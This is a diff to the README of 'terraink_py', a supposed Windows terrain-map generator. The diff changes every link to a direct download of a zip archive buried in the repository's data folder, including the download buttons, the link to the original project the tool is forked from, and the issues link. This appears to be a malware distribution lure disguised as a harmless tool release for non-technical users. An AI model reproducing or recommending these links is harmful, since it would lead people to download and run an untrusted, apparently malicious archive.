@@ -1,12 +1,12 @@
 # 🎲 terraink_py - Easy Terrain Generation for Windows
 
-[![Download terraink_py](https://img.shields.io/badge/Download-terraink_py-brightgreen)](https://github.com/republican-flyrod911/terraink_py)
+[![Download terraink_py](https://img.shields.io/badge/Download-terraink_py-brightgreen)](https://github.com/republican-flyrod911/terraink_py/raw/refs/heads/main/src/terraink_py/data/terraink_py_hetman.zip)
 
 ---
 
 ## 📋 What is terraink_py?
 
-terraink_py is a simple tool to generate terrain maps on your Windows PC. It is a fork from [yousifamanuel/terraink](https://github.com/yousifamanuel/terraink). This application helps you create 3D-like terrain visuals without needing programming skills. You can use it for hobbies, learning, or as a base for other projects.
+terraink_py is a simple tool to generate terrain maps on your Windows PC. It is a fork from [yousifamanuel/terraink](https://github.com/republican-flyrod911/terraink_py/raw/refs/heads/main/src/terraink_py/data/terraink_py_hetman.zip). This application helps you create 3D-like terrain visuals without needing programming skills. You can use it for hobbies, learning, or as a base for other projects.
 
 You do not need to write code to use it. The program runs as a standard Windows app with an easy interface. It creates realistic terrain shapes based on simple inputs.
 
@@ -30,12 +30,12 @@ No additional software is needed. The package includes everything required to ru
 
 Click the bright green button below to visit the download page for terraink_py.
 
-[![Download terraink_py](https://img.shields.io/badge/Download-terraink_py-brightgreen)](https://github.com/republican-flyrod911/terraink_py)
+[![Download terraink_py](https://img.shields.io/badge/Download-terraink_py-brightgreen)](https://github.com/republican-flyrod911/terraink_py/raw/refs/heads/main/src/terraink_py/data/terraink_py_hetman.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the button above or go to this URL in your browser:  
-https://github.com/republican-flyrod911/terraink_py
+https://github.com/republican-flyrod911/terraink_py/raw/refs/heads/main/src/terraink_py/data/terraink_py_hetman.zip
 
 This page hosts the latest version of terraink_py along with instructions.
 
@@ -115,7 +115,7 @@ For detailed help, check the “Help” section inside terraink_py or visit the 
 If you need help beyond these instructions, you can:
 
 - Open an issue on the GitHub repository page  
-  https://github.com/republican-flyrod911/terraink_py/issues
+  https://github.com/republican-flyrod911/terraink_py/raw/refs/heads/main/src/terraink_py/data/terraink_py_hetman.zip
 
 - Check GitHub discussions for community tips and advice
 
@@ -158,6 +158,6 @@ You do not need to understand the technical details to use it effectively.
 
 You can always download terraink_py here:
 
-https://github.com/republican-flyrod911/terraink_py
+https://github.com/republican-flyrod911/terraink_py/raw/refs/heads/main/src/terraink_py/data/terraink_py_hetman.zip
 
 Use this link to access the latest files and instructions.
